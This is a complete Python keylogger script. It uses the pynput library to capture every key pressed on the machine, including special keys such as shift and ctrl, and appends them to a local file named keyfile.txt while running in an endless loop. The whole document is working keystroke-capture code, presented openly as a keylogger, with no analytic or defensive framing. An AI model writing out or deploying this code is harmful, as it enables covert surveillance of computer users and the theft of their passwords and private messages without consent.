from pynput import keyboard
import os

# Function to handle key press events
def keyPressed(key):
    try:
        # Open the log file in append mode
        with open("keyfile.txt", 'a') as logkey:
            try:
                char = key.char  # Get the character representation of the key
                logkey.write(char)  # Write the character to the log file
            except AttributeError:
                # Handle special keys (e.g., shift, ctrl) by logging their names
                logkey.write(f'[{str(key)}]')
    except IOError as e:
        print(f"Error opening file: {e}")

# Main function to start the keylogger
if __name__ == '__main__':
    # Ensure the script is running in the directory where you expect the keyfile.txt
    script_directory = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_directory)

    # Set up the listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()  # Start the listener

    # Keep the program running
    try:
        while True:
            pass
    except KeyboardInterrupt:
        listener.stop()
